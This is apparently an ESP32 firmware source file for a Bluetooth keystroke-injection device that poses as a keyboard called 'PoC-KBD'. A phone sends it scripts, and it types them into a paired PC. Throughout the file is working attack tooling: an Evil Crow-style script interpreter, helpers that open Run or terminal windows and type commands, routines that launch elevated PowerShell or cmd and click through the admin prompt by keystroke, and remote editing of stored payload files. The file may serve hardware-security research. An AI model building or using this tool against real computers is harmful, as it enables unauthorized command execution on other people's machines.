// Shared BLE side (NimBLE 2.x): a HID keyboard (-> the PC) PLUS a small custom
// control service (-> the phone web page). The board holds BOTH links at once:
// the phone writes text to the control service, and the board injects it into the
// PC over BLE-HID. Advertises as "PoC-KBD"; bonds Just Works.
#include "ble_hid.h"
#include "usb_hid.h"   // pocFsRead / pocFsWrite* — edit the payload files over BLE
#include "netota.h"    // WiFi provisioning + in-app OTA self-update
#include "display.h"   // OTA progress on the LCD
#include <Arduino.h>
#include <NimBLEDevice.h>
#include <NimBLEHIDDevice.h>

// Custom control service (the phone connects here; Web Bluetooth can't touch HID).
#define CTRL_SVC "a0c50000-1234-4b0a-9c5e-000000000000"
#define CTRL_RX  "a0c50001-1234-4b0a-9c5e-000000000000"   // phone -> board: text to type
#define CTRL_TX  "a0c50002-1234-4b0a-9c5e-000000000000"   // board -> phone: status/ack

static NimBLECharacteristic* input  = nullptr;   // HID input report (-> PC)
static NimBLECharacteristic* ctrlTx = nullptr;   // control notify (-> phone)
static volatile bool g_hidReady = false;         // PC subscribed to the HID report
static int           g_conns    = 0;
static char          g_mac[18]  = "";            // our own BLE address
static char          g_pending[512] = "";        // script/text from the phone, run by the loop
static volatile bool g_hasPending = false;
static volatile bool g_ctrlReady = false;        // a phone has written to the control service
static uint16_t      g_phoneHandle = 0xFFFF;     // conn handle of that phone
static char          g_cmd[220] = "";            // pending control command (also carries file-write chunks)
static volatile bool g_cmdReq  = false;

static const uint8_t REPORT_MAP[] = {
    0x05, 0x01, 0x09, 0x06, 0xA1, 0x01,
    0x85, 0x01,
    0x05, 0x07, 0x19, 0xE0, 0x29, 0xE7, 0x15, 0x00, 0x25, 0x01, 0x75, 0x01, 0x95, 0x08, 0x81, 0x02,
    0x95, 0x01, 0x75, 0x08, 0x81, 0x01,
    0x95, 0x06, 0x75, 0x08, 0x15, 0x00, 0x25, 0x65, 0x05, 0x07, 0x19, 0x00, 0x29, 0x65, 0x81, 0x00,
    0xC0
};

static void ctrlNotify(const char* s) { if (ctrlTx) { ctrlTx->setValue((uint8_t*)s, strlen(s)); ctrlTx->notify(); } }

// keep advertising after a connection so a 2nd central (phone AND PC) can join.
class SrvCB : public NimBLEServerCallbacks {
    void onConnect(NimBLEServer*, NimBLEConnInfo&) override { g_conns++; NimBLEDevice::startAdvertising(); }
    void onDisconnect(NimBLEServer*, NimBLEConnInfo& ci, int) override {
        if (g_conns) g_conns--;
        if (ci.getConnHandle() == g_phoneHandle) { g_ctrlReady = false; g_phoneHandle = 0xFFFF; }
        NimBLEDevice::startAdvertising();
    }
};
// track whether the PC actually enabled HID notifications (keyboard "live").
class HidSubCB : public NimBLECharacteristicCallbacks {
    void onSubscribe(NimBLECharacteristic*, NimBLEConnInfo&, uint16_t v) override { g_hidReady = (v != 0); }
};

static bool asciiToHid(char c, uint8_t& mod, uint8_t& key) {
    mod = 0; key = 0;
    if (c >= 'a' && c <= 'z') { key = 0x04 + (c - 'a'); return true; }
    if (c >= 'A' && c <= 'Z') { key = 0x04 + (c - 'A'); mod = 0x02; return true; }
    if (c >= '1' && c <= '9') { key = 0x1E + (c - '1'); return true; }
    if (c == '0') { key = 0x27; return true; }
    switch (c) {
        case ' ':  key = 0x2C; return true;   case '\n': key = 0x28; return true;   case '\t': key = 0x2B; return true;
        case '-':  key = 0x2D; return true;   case '_': key = 0x2D; mod = 0x02; return true;
        case '=':  key = 0x2E; return true;   case '+': key = 0x2E; mod = 0x02; return true;
        case '[':  key = 0x2F; return true;   case '{': key = 0x2F; mod = 0x02; return true;
        case ']':  key = 0x30; return true;   case '}': key = 0x30; mod = 0x02; return true;
        case '\\': key = 0x31; return true;   case '|': key = 0x31; mod = 0x02; return true;
        case ';':  key = 0x33; return true;   case ':': key = 0x33; mod = 0x02; return true;
        case '\'': key = 0x34; return true;   case '"': key = 0x34; mod = 0x02; return true;
        case '`':  key = 0x35; return true;   case '~': key = 0x35; mod = 0x02; return true;
        case ',':  key = 0x36; return true;   case '<': key = 0x36; mod = 0x02; return true;
        case '.':  key = 0x37; return true;   case '>': key = 0x37; mod = 0x02; return true;
        case '/':  key = 0x38; return true;   case '?': key = 0x38; mod = 0x02; return true;
        case '!':  key = 0x1E; mod = 0x02; return true;   case '@': key = 0x1F; mod = 0x02; return true;
        case '#':  key = 0x20; mod = 0x02; return true;   case '$': key = 0x21; mod = 0x02; return true;
        case '%':  key = 0x22; mod = 0x02; return true;   case '^': key = 0x23; mod = 0x02; return true;
        case '&':  key = 0x24; mod = 0x02; return true;   case '*': key = 0x25; mod = 0x02; return true;
        case '(':  key = 0x26; mod = 0x02; return true;   case ')': key = 0x27; mod = 0x02; return true;
    }
    return false;
}

static void sendReport(uint8_t mod, uint8_t key) {
    uint8_t r[8] = { mod, 0, key, 0, 0, 0, 0, 0 };
    input->setValue(r, 8); input->notify(); delay(12);
    uint8_t z[8] = { 0, 0, 0, 0, 0, 0, 0, 0 };
    input->setValue(z, 8); input->notify(); delay(12);
}

void bleHidType(const char* s) {
    if (!g_hidReady || !input) { ctrlNotify("no HID host paired"); return; }
    for (const char* p = s; *p; ++p) { uint8_t m, k; if (asciiToHid(*p, m, k)) sendReport(m, k); }
    ctrlNotify("typed");
}

// ---------------------------------------------------------------------------
// Keystroke-script interpreter (Evil Crow Cable "Wind" syntax) over BLE HID.
// The phone sends a multi-line script to the control service; each line is one
// command. Network commands (ShellWin/ShellNix/ServerConnect/...) are NOT here —
// they need a TCP reverse-shell bridge this BLE PoC doesn't have. Anything not a
// known command is typed literally (implicit Print), so plain text still works.
// ---------------------------------------------------------------------------
static uint8_t s_heldMod = 0;
static uint8_t s_heldKeys[6] = { 0 };

static void bleSendHeld() {
    uint8_t r[8] = { s_heldMod, 0, s_heldKeys[0], s_heldKeys[1], s_heldKeys[2], s_heldKeys[3], s_heldKeys[4], s_heldKeys[5] };
    input->setValue(r, 8); input->notify(); delay(12);
}
static void blePressUsage(uint8_t mod, uint8_t usage) {   // add to the held report (Press)
    if (mod) s_heldMod |= mod;
    if (usage) for (int i = 0; i < 6; i++) { if (s_heldKeys[i] == usage) break; if (s_heldKeys[i] == 0) { s_heldKeys[i] = usage; break; } }
    bleSendHeld();
}
static void bleReleaseAll() { s_heldMod = 0; for (int i = 0; i < 6; i++) s_heldKeys[i] = 0; bleSendHeld(); }

static void bleCombo(uint8_t mod, uint8_t usage) {        // press mod+key together, hold, release
    uint8_t r[8] = { mod, 0, usage, 0, 0, 0, 0, 0 };
    input->setValue(r, 8); input->notify(); delay(100);
    uint8_t z[8] = { 0 }; input->setValue(z, 8); input->notify(); delay(20);
}
static void bleTypeLiteral(String s) {                    // type a string char-by-char ({MAC} expands)
    s.replace("{MAC}", g_mac);
    for (size_t i = 0; i < s.length(); i++) { uint8_t m, k; if (asciiToHid(s[i], m, k)) sendReport(m, k); }
}
static uint8_t usageOf(char c) { uint8_t m, k; return asciiToHid(c, m, k) ? k : 0; }

// key-name -> (modifier bit, HID usage). Names mirror the Evil Crow keymap.
static bool keyNameToUsage(String n, uint8_t& mod, uint8_t& usage) {
    n.trim(); mod = 0; usage = 0;
    struct { const char* n; uint8_t mod; uint8_t usage; } T[] = {
        {"KEY_LEFT_CTRL",0x01,0},{"KEY_LEFT_SHIFT",0x02,0},{"KEY_LEFT_ALT",0x04,0},{"KEY_LEFT_GUI",0x08,0},
        {"KEY_RIGHT_CTRL",0x10,0},{"KEY_RIGHT_SHIFT",0x20,0},{"KEY_RIGHT_ALT",0x40,0},{"KEY_RIGHT_GUI",0x80,0},
        {"KEY_ENTER",0,0x28},{"KEY_RETURN",0,0x28},{"KEY_ESC",0,0x29},{"KEY_BACKSPACE",0,0x2A},{"KEY_TAB",0,0x2B},{"KEY_SPACE",0,0x2C},
        {"KEY_CAPS_LOCK",0,0x39},{"KEY_F1",0,0x3A},{"KEY_F2",0,0x3B},{"KEY_F3",0,0x3C},{"KEY_F4",0,0x3D},{"KEY_F5",0,0x3E},{"KEY_F6",0,0x3F},
        {"KEY_F7",0,0x40},{"KEY_F8",0,0x41},{"KEY_F9",0,0x42},{"KEY_F10",0,0x43},{"KEY_F11",0,0x44},{"KEY_F12",0,0x45},
        {"KEY_PRINT_SCREEN",0,0x46},{"KEY_SCROLL_LOCK",0,0x47},{"KEY_PAUSE",0,0x48},{"KEY_INSERT",0,0x49},
        {"KEY_HOME",0,0x4A},{"KEY_PAGE_UP",0,0x4B},{"KEY_DELETE",0,0x4C},{"KEY_END",0,0x4D},{"KEY_PAGE_DOWN",0,0x4E},
        {"KEY_RIGHT_ARROW",0,0x4F},{"KEY_LEFT_ARROW",0,0x50},{"KEY_DOWN_ARROW",0,0x51},{"KEY_UP_ARROW",0,0x52},
        {"KEY_NUM_LOCK",0,0x53},{"KEY_MENU",0,0x65},
    };
    for (auto& e : T) if (n == e.n) { mod = e.mod; usage = e.usage; return true; }
    if (n.length() == 1) { uint8_t m, k; if (asciiToHid(n[0], m, k)) { mod = m; usage = k; return true; } }
    return false;
}

static void bleRunLine(String line) {
    line.trim();
    if (line.length() == 0 || line.startsWith("##") || line.startsWith("REM")) return;
    // one-shot modifier combos
    if (line == "Release")   { bleReleaseAll(); return; }
    if (line == "Gui")       { bleCombo(0x08, 0); return; }
    if (line == "GuiR")      { bleCombo(0x08, usageOf('r')); return; }
    if (line == "GuiSpace")  { bleCombo(0x08, 0x2C); return; }
    if (line == "AltF2")     { bleCombo(0x04, 0x3B); return; }
    if (line == "CtrlAltT")  { bleCombo(0x01 | 0x04, usageOf('t')); return; }
    if (line == "ENTER" || line == "Enter") { bleCombo(0, 0x28); return; }
    if (line.startsWith("Delay "))       { delay(line.substring(6).toInt()); return; }
    if (line.startsWith("PrintLine "))   { bleTypeLiteral(line.substring(10)); bleCombo(0, 0x28); return; }
    if (line.startsWith("Print "))       { bleTypeLiteral(line.substring(6)); return; }
    if (line.startsWith("String ") || line.startsWith("STRING ")) { bleTypeLiteral(line.substring(7)); return; }
    if (line.startsWith("PressRelease ")){ uint8_t m, u; if (keyNameToUsage(line.substring(13), m, u)) bleCombo(m, u); return; }
    if (line.startsWith("Press "))       { uint8_t m, u; if (keyNameToUsage(line.substring(6),  m, u)) blePressUsage(m, u); return; }
    if (line.startsWith("CTRLALT "))     { uint8_t m, u; if (keyNameToUsage(line.substring(8),  m, u)) bleCombo(0x01 | 0x04, u); return; }
    if (line == "GUI")                   { bleCombo(0x08, 0); return; }
    if (line.startsWith("GUI "))         { String a = line.substring(4); a.trim(); if (a == "SPACE") bleCombo(0x08, 0x2C); else { uint8_t m, u; if (keyNameToUsage(a, m, u)) bleCombo(0x08, u); } return; }
    // "run" helpers: open a launcher, wait, type the command + Enter
    if (line.startsWith("RunWin "))      { bleCombo(0x08, usageOf('r')); delay(2000); bleTypeLiteral(line.substring(7)); bleCombo(0, 0x28); return; }
    if (line.startsWith("RunNix "))      { bleCombo(0x01 | 0x04, usageOf('t')); delay(2000); bleTypeLiteral(line.substring(7)); bleCombo(0, 0x28); return; }
    if (line.startsWith("RunMac "))      { bleCombo(0x08, 0x2C); delay(2000); bleTypeLiteral(line.substring(7)); bleCombo(0, 0x28); return; }
    if (line.startsWith("RunLauncher ")) { bleCombo(0x04, 0x3B); delay(2000); bleTypeLiteral(line.substring(12)); bleCombo(0, 0x28); return; }
    if (line.startsWith("RunPowershellAdmin")) { bleCombo(0x08, usageOf('x')); delay(2000); bleTypeLiteral("a"); delay(3000); bleCombo(0, 0x50); delay(100); bleCombo(0, 0x28); return; }
    if (line.startsWith("RunCmdAdmin"))  { bleCombo(0x08, usageOf('r')); delay(2000); bleTypeLiteral("cmd"); delay(2000); bleCombo(0x01 | 0x02, 0x28); delay(2000); bleCombo(0, 0x50); delay(100); bleCombo(0, 0x28); return; }
    // WinPrint uses Alt+numpad unicode on Windows; for ASCII an ordinary type is
    // equivalent, so alias to Print/PrintLine.
    if (line.startsWith("WinPrintLine ")) { bleTypeLiteral(line.substring(13)); bleCombo(0, 0x28); return; }
    if (line.startsWith("WinPrint "))      { bleTypeLiteral(line.substring(9)); return; }
    // Recognised but unsupported over BLE (need the USB LED fingerprint, or a TCP
    // reverse-shell bridge). Ignore them rather than typing the keyword out.
    if (line == "DetectOS" || line.startsWith("ShellWin") || line.startsWith("ShellNix")
        || line.startsWith("ShellMac") || line.startsWith("ServerConnect")) return;
    // fallback: type the whole line literally (implicit Print)
    bleTypeLiteral(line);
}

static void bleHidRun(const char* text) {
    if (!g_hidReady || !input) { ctrlNotify("no HID host paired"); return; }
    const char* p = text; String line;
    while (*p) {
        line = "";
        while (*p && *p != '\n') { if (*p != '\r') line += *p; p++; }
        if (*p == '\n') p++;
        bleRunLine(line);
    }
    bleReleaseAll();                 // safety: nothing left held
    ctrlNotify("done");
}

// Phone writes text here -> QUEUE it; the main loop does the actual typing.
// (Sending HID notifications from inside a BLE write-callback misfires.)
class RxCB : public NimBLECharacteristicCallbacks {
    void onWrite(NimBLECharacteristic* c, NimBLEConnInfo& ci) override {
        g_ctrlReady = true; g_phoneHandle = ci.getConnHandle();   // this connection is the phone
        std::string v = c->getValue();
        if (v.empty()) return;
        if (v.rfind("__", 0) == 0) { strncpy(g_cmd, v.c_str(), sizeof(g_cmd) - 1); g_cmd[sizeof(g_cmd) - 1] = 0; g_cmdReq = true; return; }
        strncpy(g_pending, v.c_str(), sizeof(g_pending) - 1); g_pending[sizeof(g_pending) - 1] = 0; g_hasPending = true;
    }
};

void bleHidBegin() {
    NimBLEDevice::init("PoC-KBD");
    NimBLEDevice::setSecurityAuth(true, false, true);
    NimBLEDevice::setSecurityIOCap(BLE_HS_IO_NO_INPUT_OUTPUT);
    strncpy(g_mac, NimBLEDevice::getAddress().toString().c_str(), sizeof(g_mac) - 1);

    NimBLEServer* server = NimBLEDevice::createServer();
    server->setCallbacks(new SrvCB());

    NimBLEHIDDevice* hid = new NimBLEHIDDevice(server);
    hid->setManufacturer("poc-lab");
    hid->setPnp(0x02, 0xE502, 0xA111, 0x0210);
    hid->setHidInfo(0x00, 0x01);
    hid->setReportMap((uint8_t*)REPORT_MAP, sizeof(REPORT_MAP));
    input = hid->getInputReport(1);
    input->setCallbacks(new HidSubCB());
    hid->setBatteryLevel(100);

    // Custom control service for the phone web page.
    NimBLEService* ctrl = server->createService(CTRL_SVC);
    NimBLECharacteristic* rx = ctrl->createCharacteristic(
        CTRL_RX, NIMBLE_PROPERTY::WRITE | NIMBLE_PROPERTY::WRITE_NR);
    rx->setCallbacks(new RxCB());
    ctrlTx = ctrl->createCharacteristic(CTRL_TX, NIMBLE_PROPERTY::NOTIFY);
    ctrl->start();

    NimBLEAdvertising* adv = NimBLEDevice::getAdvertising();
    adv->setName("PoC-KBD");                                     // <- ensure the NAME is advertised
    adv->setAppearance(0x03C1);                                  // HID keyboard
    adv->addServiceUUID(hid->getHidService()->getUUID());        // PC recognizes a keyboard
    adv->enableScanResponse(true);
    NimBLEDevice::startAdvertising();
}

bool bleHidConnected() { return g_hidReady; }   // "keyboard live" = PC subscribed to HID
bool bleHidPhone()     { return g_ctrlReady; }  // phone/web on the control service
const char* bleHidMac() { return g_mac; }

int  bleHidConnCount() { NimBLEServer* s = NimBLEDevice::getServer(); return s ? s->getConnectedCount() : 0; }

// Board-side control: drop every current BLE link (PC + phone), then re-advertise.
void bleHidDropAll() {
    NimBLEServer* s = NimBLEDevice::getServer();
    if (!s) return;
    for (uint16_t h : s->getPeerDevices()) s->disconnect(h);
    g_hidReady = false; g_ctrlReady = false;
    NimBLEDevice::startAdvertising();
}

// Control commands from the phone (run in the loop, not a BLE callback).
//   __BONDS__            -> reply "bonds:0=aa:bb..;1=cc:dd.." (per-device list)
//   __FORGET__:<index>   -> delete that ONE bond (+ disconnect it if connected)
//   __FORGETALL__        -> wipe every bond
// OTA progress -> LCD + a throttled BLE notify (every ~5%, plus 0/100).
static void otaProgress(int pct, const char* msg) {
    static int last = -1;
    if (pct == last) return;
    if (pct == 0 || pct == 100 || pct / 5 != last / 5) {
        char b[72]; snprintf(b, sizeof(b), "%d%%\n%s", pct, msg); dispShow("OTA UPDATE", b, 0xF7C948);
        char n[80]; snprintf(n, sizeof(n), "ota:%d %s", pct, msg); ctrlNotify(n);
    }
    last = pct;
}

static void handleCmd(const char* cmd) {
    if (!strcmp(cmd, "__BONDS__")) {
        NimBLEServer* srv = NimBLEDevice::getServer();
        int n = NimBLEDevice::getNumBonds();
        String s = "bonds:";
        if (n == 0) s += "(none)";
        for (int i = 0; i < n; i++) {
            NimBLEAddress a = NimBLEDevice::getBondedAddress(i);
            bool conn = false;
            if (srv) for (uint16_t h : srv->getPeerDevices()) if (srv->getPeerInfoByHandle(h).getAddress() == a) { conn = true; break; }
            if (i) s += ";";
            s += String(i) + "|" + a.toString().c_str() + "|" + (conn ? "1" : "0");   // idx|addr|connected
        }
        ctrlNotify(s.c_str());
    } else if (!strncmp(cmd, "__FORGET__:", 11)) {
        int idx = atoi(cmd + 11);
        if (idx >= 0 && idx < NimBLEDevice::getNumBonds()) {
            NimBLEAddress a = NimBLEDevice::getBondedAddress(idx);
            NimBLEServer* srv = NimBLEDevice::getServer();
            if (srv) for (uint16_t h : srv->getPeerDevices()) if (srv->getPeerInfoByHandle(h).getAddress() == a) srv->disconnect(h);
            NimBLEDevice::deleteBond(a);
            ctrlNotify((String("forgot ") + a.toString().c_str()).c_str());
        }
    } else if (!strcmp(cmd, "__FORGETALL__")) {
        NimBLEDevice::deleteAllBonds(); ctrlNotify("forgot all bonds"); bleHidDropAll();
    } else if (!strcmp(cmd, "__DROP__")) {
        ctrlNotify("dropping links"); bleHidDropAll();
    } else if (!strncmp(cmd, "__GET__:", 8)) {
        // Stream /<os>.txt back to the phone in MTU-safe frames.
        const char* os = cmd + 8;
        String c;
        if (!pocFsRead(os, c)) { ctrlNotify("ferr:read"); return; }
        String hdr = "fbeg:"; hdr += os; hdr += ":"; hdr += c.length();
        ctrlNotify(hdr.c_str());
        delay(20);                     // gap so fbeg isn't dropped before the first fdat
        const size_t CK = 160;
        for (size_t i = 0; i < c.length(); i += CK) {
            size_t n = (c.length() - i < CK) ? (c.length() - i) : CK;
            String d = "fdat:"; d += c.substring(i, i + n);
            ctrlNotify(d.c_str());
            delay(20);                 // let each notify drain before the next
        }
        String end = "fend:"; end += os; ctrlNotify(end.c_str());
    } else if (!strncmp(cmd, "__PUT__:", 8)) {
        ctrlNotify(pocFsWriteBegin(cmd + 8) ? "wok" : "ferr:open");
    } else if (!strncmp(cmd, "__W__:", 6)) {
        const char* d = cmd + 6;
        ctrlNotify(pocFsWriteChunk((const uint8_t*)d, strlen(d)) ? "wok" : "ferr:write");
    } else if (!strcmp(cmd, "__WEND__")) {
        size_t sz = 0;
        if (pocFsWriteEnd(sz)) { String r = "fdone:"; r += sz; ctrlNotify(r.c_str()); }
        else ctrlNotify("ferr:close");
    } else if (!strcmp(cmd, "__WIFIST__")) {
        ctrlNotify(netStatus().c_str());
    } else if (!strncmp(cmd, "__WIFI__:", 9)) {
        String v = cmd + 9; int bar = v.indexOf('|');
        if (bar < 0) { ctrlNotify("wifi:badfmt"); return; }
        netSetCreds(v.substring(0, bar), v.substring(bar + 1));
        ctrlNotify("wifi:saved");
    } else if (!strcmp(cmd, "__WIFICLR__")) {
        netClearCreds(); ctrlNotify("wifi:cleared");
    } else if (!strcmp(cmd, "__OTA__")) {
        ctrlNotify("ota:0 starting");
        String r = netOtaUpdate(otaProgress);
        if (r == "ok") { ctrlNotify("ota:100 rebooting"); delay(500); ESP.restart(); }
        else ctrlNotify((String("ota:err ") + r).c_str());
    }
}

// Runs in the main loop (safe context, not a BLE callback): handle queued work.
void bleHidTick() {
    if (g_cmdReq) { g_cmdReq = false; handleCmd(g_cmd); }
    if (g_hasPending) { g_hasPending = false; bleHidRun(g_pending); }
}
